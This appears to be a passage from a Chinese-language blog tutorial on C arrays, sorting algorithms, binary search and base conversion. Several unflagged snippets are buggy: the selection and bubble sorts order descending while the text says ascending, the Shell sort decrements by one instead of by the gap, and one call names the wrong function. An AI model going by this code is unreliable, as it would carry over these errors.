<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 没有指定元素个数，错误</span></span><br><span class="line"><span class="keyword">int</span> a[];</span><br><span class="line"></span><br><span class="line"><span class="comment">// []中不能放变量</span></span><br><span class="line"><span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> ages[number]; <span class="comment">// 老版本的C语言规范不支持</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ages[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> ages2[number] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>&#125; <span class="comment">// 直接报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只能在定义数组的时候进行一次性（全部赋值）的初始化</span></span><br><span class="line"><span class="keyword">int</span> ages3[<span class="number">5</span>];</span><br><span class="line">ages10 = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个长度为n的数组,最大下标为n-1, 下标范围:0~n-1</span></span><br><span class="line"><span class="keyword">int</span> ages4[<span class="number">4</span>] = &#123;<span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>&#125;</span><br><span class="line">ages4[<span class="number">8</span>]; <span class="comment">// 数组角标越界</span></span><br></pre></td></tr></table></figure>

<ul>
<li>练习<ul>
<li>从键盘录入当天出售BTC的价格并计算出售的BTC的总价和平均价(比如说一天出售了10个比特币)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="数组和函数"><a href="#数组和函数" class="headerlink" title="数组和函数"></a>数组和函数</h2><ul>
<li>数组可以作为函数的参数使用,数组用作函数参数有两种形式:<ul>
<li>￼一种是把数组元素作为实参使用</li>
<li>￼一种是把数组名作为函数的形参和实参使用</li>
</ul>
</li>
</ul>
<h2 id="数组元素作为函数参数"><a href="#数组元素作为函数参数" class="headerlink" title="数组元素作为函数参数"></a>数组元素作为函数参数</h2><ul>
<li>数组的元素作为函数实参，与同类型的简单变量作为实参一样，如果是基本数据类型, 那么形参的改变不影响实参</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> val)</span><span class="comment">// int val = number</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    val = <span class="number">55</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ages[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ages[0] = %d&quot;</span>, ages[<span class="number">0</span>]);<span class="comment">// 1</span></span><br><span class="line">    change(ages[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ages[0] = %d&quot;</span>, ages[<span class="number">0</span>]);<span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>用数组元素作函数参数不要求形参也必须是数组元素</li>
</ul>
</blockquote>
<h2 id="数组名作为函数参数"><a href="#数组名作为函数参数" class="headerlink" title="数组名作为函数参数"></a>数组名作为函数参数</h2><ul>
<li>在C语言中,数组名除作为变量的标识符之外,数组名还代表了该数组在内存中的起始地址,因此,当数组名作函数参数时,实参与形参之间不是”值传递”,而是”地址传递”</li>
<li>实参数组名将该数组的起始地址传递给形参数组,两个数组共享一段内存单元, 系统不再为形参数组分配存储单元</li>
<li>既然两个数组共享一段内存单元, 所以形参数组修改时，实参数组也同时被修改了</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change2</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">3</span>])</span><span class="comment">// int array = 0ffd1</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">0</span>] = <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ages[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ages[0] = %d&quot;</span>, ages[<span class="number">0</span>]);<span class="comment">// 1</span></span><br><span class="line">    change(ages);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ages[0] = %d&quot;</span>, ages[<span class="number">0</span>]);<span class="comment">// 88</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组名作函数参数的注意点"><a href="#数组名作函数参数的注意点" class="headerlink" title="数组名作函数参数的注意点"></a>数组名作函数参数的注意点</h2><ul>
<li>在函数形参表中,允许不给出形参数组的长度</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">0</span>] = <span class="number">88</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>形参数组和实参数组的类型必须一致,否则将引起错误。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prtArray</span><span class="params">(<span class="keyword">double</span> <span class="built_in">array</span>[<span class="number">3</span>])</span> <span class="comment">// 错误写法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;array[%d], %f&quot;</span>, i, <span class="built_in">array</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ages[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>&#125;;</span><br><span class="line">    prtArray(ages[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当数组名作为函数参数时, 因为自动转换为了指针类型，所以在函数中无法动态计算除数组的元素个数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printArray size = %lu\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>)); <span class="comment">// 8</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="keyword">sizeof</span>(<span class="built_in">array</span>)/ <span class="keyword">sizeof</span>(<span class="keyword">int</span>); <span class="comment">// 2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;length = %d&quot;</span>, length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>练习:<ul>
<li>设计一个函数int arrayMax(int a[], int count)找出数组元素的最大值</li>
<li>从键盘输入3个0-9的数字,然后输出0~9中哪些数字没有出现过</li>
<li>要求从键盘输入6个0~9的数字,排序后输出</li>
</ul>
</li>
</ul>
<h2 id="计数排序（Counting-Sort）"><a href="#计数排序（Counting-Sort）" class="headerlink" title="计数排序（Counting Sort）"></a>计数排序（Counting Sort）</h2><ul>
<li><p>计数排序是一个非基于比较的排序算法，该算法于1954年由 Harold H. Seward 提出。它的优势在于在<code>对一定范围内的整数排序</code>时，快于任何比较排序算法。</p>
</li>
<li><p>排序思路:</p>
<ul>
<li>1.找出待排序数组最大值</li>
<li>2.定义一个索引最大值为待排序数组最大值的数组</li>
<li>3.遍历待排序数组, 将待排序数组遍历到的值作新数组索引</li>
<li>4.在新数组对应索引存储值原有基础上+1<br><img src="/2022/01/15/C/eaed8e0890b2a50353ec24850941e789.png" alt="img"></li>
</ul>
</li>
<li><p>简单代码实现:</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 待排序数组</span></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">5</span>] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="comment">// 用于排序数组</span></span><br><span class="line">    <span class="keyword">int</span> newNums[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// 计算待排序数组长度</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="keyword">sizeof</span>(nums) / <span class="keyword">sizeof</span>(nums[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 遍历待排序数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="comment">// 取出待排序数组当前值</span></span><br><span class="line">        <span class="keyword">int</span> index = nums[i];</span><br><span class="line">        <span class="comment">// 将待排序数组当前值作为排序数组索引</span></span><br><span class="line">        <span class="comment">// 将用于排序数组对应索引原有值+1</span></span><br><span class="line">        newNums[index] = newNums[index] +<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算待排序数组长度</span></span><br><span class="line">    <span class="keyword">int</span> len2 = <span class="keyword">sizeof</span>(newNums) / <span class="keyword">sizeof</span>(newNums[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 输出排序数组索引, 就是排序之后结果</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len2; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; newNums[i]; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    // 计算待排序数组长度</span></span><br><span class="line"><span class="comment">    int len2 = sizeof(newNums) / sizeof(newNums[0]);</span></span><br><span class="line"><span class="comment">    // 还原排序结果到待排序数组</span></span><br><span class="line"><span class="comment">    for(int i = 0; i &lt; len2; i++)&#123;</span></span><br><span class="line"><span class="comment">        int index = 0;</span></span><br><span class="line"><span class="comment">        for(int i = 0; i &lt; len; i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j = 0; j &lt; newNums[i]; j++)&#123;</span></span><br><span class="line"><span class="comment">                nums[index++] = i;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><ul>
<li>选择排序(Selection sort)是一种简单直观的排序算法。它的工作原理如下。首先在未排序序列中找到最小元素,存放到排序序列的起始位置,然后,再从剩余未排序元素中继续寻找最小元素,然后放到排序序列末尾。以此类推,直到所有元素均排序完毕。<br><img src="/2022/01/15/C/fe7b9e4e887e90b496fa9351b91f569c.gif" alt="img"></li>
<li>排序思路:<ul>
<li>假设按照升序排序</li>
<li>1.用第0个元素和后面所有元素依次比较</li>
<li>2.判断第0个元素是否大于当前被比较元素, 一旦小于就交换位置</li>
<li>3.第0个元素和后续所有元素比较完成后, 第0个元素就是最小值</li>
<li>4.排除第0个元素, 用第1个元素重复1~3操作, 比较完成后第1个元素就是倒数第二小的值</li>
<li>以此类推, 直到当前元素没有可比较的元素, 排序完成</li>
</ul>
</li>
<li>代码实现:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 选择排序</span><br><span class="line">void selectSort(int numbers[], int length) &#123;</span><br><span class="line">    </span><br><span class="line">    // 外循环为什么要-1?</span><br><span class="line">    // 最后一位不用比较, 也没有下一位和它比较, 否则会出现错误访问</span><br><span class="line">    for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">        for (int j = i; j &lt; length - 1; j++) &#123;</span><br><span class="line">            // 1.用当前元素和后续所有元素比较</span><br><span class="line">            if (numbers[i] &lt; numbers[j + 1]) &#123;</span><br><span class="line">                //  2.一旦发现小于就交换位置</span><br><span class="line">                swapEle(numbers, i, j + 1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 交换两个元素的值, i/j需要交换的索引</span><br><span class="line">void swapEle(int array[], int i, int j) &#123;</span><br><span class="line">    int temp = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><ul>
<li>冒泡排序(Bubble Sort)是一种简单的排序算法。它重复 地走访过要排序的数列,一次比较两个元素,如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换,也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。<br><img src="/2022/01/15/C/020ed41347b2d78bde3cfa328867ccdb.gif" alt="img"></li>
<li>排序思路:<ul>
<li>假设按照升序排序</li>
<li>1.从第0个元素开始, 每次都用相邻两个元素进行比较</li>
<li>2.一旦发现后面一个元素小于前面一个元素就交换位置</li>
<li>3.经过一轮比较之后最后一个元素就是最大值</li>
<li>4.排除最后一个元素, 以此类推, 每次比较完成之后最大值都会出现再被比较所有元素的最后</li>
<li>直到当前元素没有可比较的元素, 排序完成</li>
</ul>
</li>
<li>代码实现:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 冒泡排序</span><br><span class="line">void bubbleSort(int numbers[], int length) &#123;</span><br><span class="line">    for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">        // -1防止`角标越界`: 访问到了不属于自己的索引</span><br><span class="line">        for (int j = 0; j &lt; length - i - 1; j++) &#123;</span><br><span class="line">           //  1.用当前元素和相邻元素比较</span><br><span class="line">            if (numbers[j] &lt; numbers[j + 1]) &#123;</span><br><span class="line">                //  2.一旦发现小于就交换位置</span><br><span class="line">                swapEle(numbers, j, j + 1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 交换两个元素的值, i/j需要交换的索引</span><br><span class="line">void swapEle(int array[], int i, int j) &#123;</span><br><span class="line">    int temp = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><ul>
<li>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。<br><img src="/2022/01/15/C/dcade1832cecd2072bd6d7e4b515ec2e.gif" alt="img"></li>
<li>排序思路:<ul>
<li>假设按照升序排序</li>
<li>1.从索引为1的元素开始向前比较, 一旦前面一个元素大于自己就让前面的元素先后移动</li>
<li>2.直到没有可比较元素或者前面的元素小于自己的时候, 就将自己插入到当前空出来的位置</li>
</ul>
</li>
<li>代码实现:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 待排序数组</span><br><span class="line">    int nums[5] = &#123;3, 1, 2, 0, 3&#125;;</span><br><span class="line">    // 0.计算待排序数组长度</span><br><span class="line">    int len = sizeof(nums) / sizeof(nums[0]);</span><br><span class="line"></span><br><span class="line">    //  1.从第一个元素开始依次取出所有用于比较元素</span><br><span class="line">    for (int i = 1; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        // 2.取出用于比较元素</span><br><span class="line">        int temp = nums[i];</span><br><span class="line">        int j = i;</span><br><span class="line">        while(j &gt; 0)&#123;</span><br><span class="line">            // 3.判断元素是否小于前一个元素</span><br><span class="line">            if(temp &lt; nums[j - 1])&#123;</span><br><span class="line">                // 4.让前一个元素向后移动一位</span><br><span class="line">                nums[j] = nums[j - 1];</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        // 5.将元素插入到空出来的位置</span><br><span class="line">        nums[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 待排序数组</span></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">5</span>] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="comment">// 0.计算待排序数组长度</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="keyword">sizeof</span>(nums) / <span class="keyword">sizeof</span>(nums[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  1.从第一个元素开始依次取出所有用于比较元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 2.遍历取出前面元素进行比较</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 3.如果前面一个元素大于当前元素,就交换位置</span></span><br><span class="line">            <span class="keyword">if</span>(nums[j<span class="number">-1</span>] &gt; nums[j])&#123;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[j];</span><br><span class="line">                nums[j] = nums[j - <span class="number">1</span>];</span><br><span class="line">                nums[j - <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><ul>
<li><p>1959年Shell发明，第一个突破O(n2)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序。<br><img src="/2022/01/15/C/385a1371f2859fbd2943203730eb3ba1.gif" alt="img"></p>
</li>
<li><p>排序思路:</p>
<ul>
<li>1.希尔排序可以理解为插入排序的升级版, 先将待排序数组按照指定步长划分为几个小数组</li>
<li>2.利用插入排序对小数组进行排序, 然后将几个排序的小数组重新合并为原始数组</li>
<li>3.重复上述操作, 直到步长为1时,再利用插入排序排序即可</li>
</ul>
</li>
<li><p>代码实现:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 待排序数组</span></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">5</span>] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="comment">// 0.计算待排序数组长度</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="keyword">sizeof</span>(nums) / <span class="keyword">sizeof</span>(nums[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.计算步长</span></span><br><span class="line">    <span class="keyword">int</span> gap = len / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="comment">//  1.从第一个元素开始依次取出所有用于比较元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = gap; i &lt; len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 2.遍历取出前面元素进行比较</span></span><br><span class="line">            <span class="keyword">int</span> j = i;</span><br><span class="line">            <span class="keyword">while</span>((j - gap) &gt;= <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%i &gt; %i\n&quot;</span>, nums[j - gap], nums[j]);</span><br><span class="line">                <span class="comment">// 3.如果前面一个元素大于当前元素,就交换位置</span></span><br><span class="line">                <span class="keyword">if</span>(nums[j - gap] &gt; nums[j])&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = nums[j];</span><br><span class="line">                    nums[j] = nums[j - gap];</span><br><span class="line">                    nums[j - gap] = temp;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 每个小数组排序完成, 重新计算步长</span></span><br><span class="line">        gap = gap / <span class="number">2</span>;</span><br><span class="line">    &#125;<span class="keyword">while</span>(gap &gt;= <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h2><ul>
<li><strong>基本思路</strong></li>
<li>在有序表中,取中间元素作为比较对象,若给定值与中间元素的要查找的数相等,则查找成功;若给定值小于中间元素的要查找的数,则在中间元素的左半区继续查找;</li>
<li>若给定值大于中间元素的要查找的数,则在中间元素的右半区继续查找。不断重复上述查找过 程,直到查找成功,或所查找的区域无数据元素,查找失败</li>
</ul>
<hr>
<ul>
<li><strong>实现步骤</strong></li>
<li>在有序表中,取中间元素作为比较对象,若给定值与中间元素的要查找的数相等,则查找成功;</li>
<li>若给定值小于中间元素的要查找的数,则在中间元素的左半区继续查找;</li>
<li>若给定值大于中间元素的要查找的数,则在中间元素的右半区继续查找。</li>
<li>不断重复上述查找过 程,直到查找成功,或所查找的区域无数据元素,查找失败。<br><img src="/2022/01/15/C/b394e0af450fe9756414a64877b3b0f3.png" alt="img"></li>
</ul>
</li>
<li><p><strong>代码实现</strong></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int findKey(int values[], int length, int key) &#123;</span><br><span class="line">    // 定义一个变量记录最小索引</span><br><span class="line">    int min = 0;</span><br><span class="line">    // 定义一个变量记录最大索引</span><br><span class="line">    int max = length - 1;</span><br><span class="line">    // 定义一个变量记录中间索引</span><br><span class="line">    int mid = (min + max) * 0.5;</span><br><span class="line">    </span><br><span class="line">    while (min &lt;= max) &#123;</span><br><span class="line">        // 如果mid对应的值 大于 key, 那么max要变小</span><br><span class="line">        if (values[mid] &gt; key) &#123;</span><br><span class="line">            max = mid - 1;</span><br><span class="line">            // 如果mid对应的值 小于 key, 那么min要变</span><br><span class="line">        &#125;else if (values[mid] &lt; key) &#123;</span><br><span class="line">            min = mid + 1;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            return mid;</span><br><span class="line">        &#125;</span><br><span class="line">        // 修改完min/max之后, 重新计算mid的值</span><br><span class="line">        mid = (min + max) * 0.5;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进制转换-查表法"><a href="#进制转换-查表法" class="headerlink" title="进制转换(查表法)"></a>进制转换(查表法)</h2><ul>
<li>实现思路:<ul>
<li>将二进制、八进制、十进制、十六进制所有可能的字符都存入数组</li>
<li>利用按位与运算符和右移依次取出当前进制对应位置的值</li>
<li>利用取出的值到数组中查询当前位输出的结果</li>
<li>将查询的结果存入一个新的数组, 当所有位都查询存储完毕, 新数组中的值就是对应进制的值</li>
</ul>
</li>
<li>代码实现</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">toBinary</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    total(num, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">toOct</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    total(num, <span class="number">7</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">toHex</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    total(num, <span class="number">15</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">total</span><span class="params">(<span class="keyword">int</span> num , <span class="keyword">int</span> base, <span class="keyword">int</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//    1.定义表用于查询结果</span></span><br><span class="line">    <span class="keyword">char</span> cs[] = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//    2.定义保存结果的数组</span></span><br><span class="line">    <span class="keyword">char</span> rs[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">//    计算最大的角标位置</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="keyword">sizeof</span>(rs)/<span class="keyword">sizeof</span>(<span class="keyword">char</span>);</span><br><span class="line">    <span class="keyword">int</span> pos = length;<span class="comment">//8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (num != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> index = num &amp; base;</span><br><span class="line">        rs[--pos] = cs[index];</span><br><span class="line">        num = num &gt;&gt; offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = pos; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, rs[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    toBinary(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><ul>
<li>所谓二维数组就是一个一维数组的每个元素又被声明为一 维数组,从而构成二维数组. 可以说二维数组是特殊的一维数组。</li>
<li>示例:<ul>
<li>int a[2][3] = { {80,75,92}, {61,65,71}};</li>
<li>可以看作由一维数组a[0]和一维数组a[1]组成，这两个一维数组都包含了3个int类型的元素<br><img src="/2022/01/15/C/c716d53c6b228ea211a524645a5d13a5.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="二维数组的定义"><a href="#二维数组的定义" class="headerlink" title="二维数组的定义"></a>二维数组的定义</h2><ul>
<li>格式:<ul>
<li>数据类型 数组名[一维数组的个数][一维数组的元素个数]</li>
<li>其中”一维数组的个数”表示当前二维数组中包含多少个一维数组</li>
<li>其中”一维数组的元素个数”表示当前前二维数组中每个一维数组元素的个数</li>
